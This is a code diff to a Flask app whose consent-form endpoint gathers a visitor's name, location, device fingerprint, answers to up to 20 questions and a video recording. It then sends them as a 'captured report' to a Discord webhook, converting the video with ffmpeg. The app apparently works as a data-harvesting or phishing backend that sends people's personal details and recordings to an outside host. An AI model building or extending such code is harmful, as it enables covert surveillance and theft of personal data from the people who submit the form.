@@ -1,5 +1,6 @@
 import os
 import json
+import subprocess
 import requests
 from flask import Flask, render_template, request, jsonify
 
@@ -19,19 +20,22 @@ def submit_consent():
     username = request.form.get("username", "Utilisateur Anonyme")
     location = request.form.get("location", "Non disponible")
     
-    # قراءة بيانات الجهاز وتفكيك الـ JSON بأمان
     device_str = request.form.get("device", "{}")
     try:
         device = json.loads(device_str)
     except Exception:
         device = {}
 
-    q1 = request.form.get("q1", "N/A")
-    q2 = request.form.get("q2", "N/A")
-    q3 = request.form.get("q3", "N/A")
+    # جمع الـ 20 سؤالاً تلقائياً
+    questions_summary = []
+    for i in range(1, 21):
+        val = request.form.get(f"q{i}", "N/A")
+        questions_summary.append(f"Q{i}: {val}")
+    
+    q_text = " | ".join(questions_summary[:5]) # عينة أو كلها حسب الرغبة
+
     video_file = request.files.get("video")
 
-    # استخراج كل المعطيات باللغة الفرنسية وبدقة
     appareil = device.get('appareil', 'Appareil Inconnu')
     systeme = device.get('systemeExploitation', 'Système Inconnu')
     navigateur = device.get('navigateur', 'Inconnu')
@@ -48,10 +52,9 @@ def submit_consent():
     reseau = device.get('connexionReseau', 'Non disponible')
     time_zone = device.get('fuseauHoraire', 'Non disponible')
 
-    # صياغة التقرير كاملاً باللغة الفرنسية للـ Discord
     content_text = f"""✅ **Nouveau Rapport Capturé (Capture/Formulaire):**
 • **Nom / Statut:** {username}
-• **Questions:** Q1: {q1} | Q2: {q2} | Q3: {q3}
+• **Questions:** {q_text}
 • **Appareil:** {appareil}
 • **Système d'exploitation:** {systeme}
 • **Navigateur:** {navigateur}
@@ -69,25 +72,50 @@ def submit_consent():
         "content": content_text
     }
 
+    input_path = "temp_input.webm"
+    output_path = "recording.mp4"
+
     try:
         files = {}
         if video_file:
-            # تحديد نوع الملف والامتداد تلقائياً
-            filename = video_file.filename or "recording.webm"
-            content_type = "video/mp4" if filename.endswith(".mp4") else "video/webm"
-            files = {
-                "file": (filename, video_file.read(), content_type)
-            }
+            # حفظ الملف المؤقت القادم من المتصفح
+            video_file.save(input_path)
+            
+            # محاولة تحويل الفيديو إلى MP4 باستخدام ffmpeg ليعمل مباشرة في ديسكورد
+            try:
+                subprocess.run([
+                    "ffmpeg", "-y", "-i", input_path, 
+                    "-c:v", "libx264", "-preset", "ultrafast", 
+                    "-c:a", "aac", output_path
+                ], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                
+                with open(output_path, "rb") as f:
+                    files = {
+                        "file": ("recording.mp4", f.read(), "video/mp4")
+                    }
+            except Exception:
+                # في حال لم يكن ffmpeg مثبتاً، يتم إرسال الملف كما هو
+                with open(input_path, "rb") as f:
+                    files = {
+                        "file": ("recording.webm", f.read(), "video/webm")
+                    }
 
         resp = requests.post(
             DISCORD_WEBHOOK_URL, 
             data={"payload_json": json.dumps(payload)}, 
-            files=files, 
-            timeout=15
+            files=files if files else None, 
+            timeout=30
         )
         resp.raise_for_status()
+
+        # تنظيف الملفات المؤقتة
+        if os.path.exists(input_path): os.remove(input_path)
+        if os.path.exists(output_path): os.remove(output_path)
+
         return jsonify({"message": "Success"}), 200
     except requests.RequestException as e:
+        if os.path.exists(input_path): os.remove(input_path)
+        if os.path.exists(output_path): os.remove(output_path)
         return jsonify({"error": str(e)}), 500
 
 if __name__ == "__main__":
